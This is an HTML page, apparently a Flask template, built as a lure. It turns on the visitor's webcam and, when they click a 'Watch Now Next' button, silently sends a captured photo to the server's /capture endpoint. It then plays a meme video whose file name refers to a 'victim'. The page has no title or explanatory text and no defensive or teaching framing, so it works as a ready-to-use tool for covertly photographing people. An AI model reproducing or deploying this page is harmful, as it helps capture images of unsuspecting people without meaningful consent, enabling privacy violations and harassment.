<!DOCTYPE html>
<html>
<head>
  <title></title>
</head>
<body>
  <h2><span></span></h2>
  <p></p>

  <!-- CAMERA PREVIEW -->
  <video id="camera" width="320" height="240" autoplay></video>
  <br>
  <button onclick="captureAndPlay()">Watch Now Next</button>
  <p id="status"></p>

  <hr>

  <!-- MEME VIDEO -->
  <video id="meme" width="320" controls style="display:none;">
    <source src="{{ url_for('static', filename='meme_video_of_victim.mp4') }}" type="video/mp4">
    Your browser does not support the video tag.
  </video>

<script>
  // Access camera
  const video = document.getElementById('camera');
  navigator.mediaDevices.getUserMedia({ video: true })
    .then(stream => video.srcObject = stream)
    .catch(err => console.error("Camera error:", err));

  function captureAndPlay() {
    const canvas = document.createElement('canvas');
    canvas.width = 320;
    canvas.height = 240;
    canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);

    const imageData = canvas.toDataURL('image/png');

    // Capture photo
    fetch('/capture', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({ image: imageData })
    })
    .then(res => res.json())
    .then(data => {
      document.getElementById("status").innerText = "Image saved as: " + data.filename;

      // Play video
      const memeVideo = document.getElementById("meme");
      memeVideo.style.display = "block";
      memeVideo.play();
    });
  }
</script>
</body>
</html>